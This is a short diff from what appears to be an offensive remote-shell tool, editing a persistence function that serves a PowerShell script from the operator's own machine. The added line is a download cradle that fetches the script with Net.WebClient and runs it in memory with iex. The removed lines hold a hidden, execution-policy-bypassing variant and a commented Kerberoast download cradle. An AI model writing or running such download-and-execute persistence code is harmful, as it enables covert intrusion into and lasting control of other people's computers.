@@ -293,10 +293,10 @@ def persist_shell(conn, addr, shell_id):
     ps_script = ps_script.replace('port_number', '5555')
     with open('persist.ps1', 'w') as save:
         save.write(ps_script)
-    url = f"https://{get_my_ip()}:8443/persist.ps1"
+    url = f"http://{get_my_ip()}:8585/persist.ps1"
     # Convert the script to a base64 string
-    command = f'powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command "iex ((iwr -Uri {url}).Content)"'
-    #iex​(New-Object Net.WebClient).DownloadString('https://YOUR_IP/Kerberoast.ps1') 
+    #command = f'powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command "iex ((iwr -Uri {url}).Content)"'
+    command=f"""iex (New-Object Net.WebClient).DownloadString('{url}')"""
     # Create the PowerShell command
     print("\033[91m[*] Executing Keres in memory ..... \033[0m")
     # Execute the command on shell 
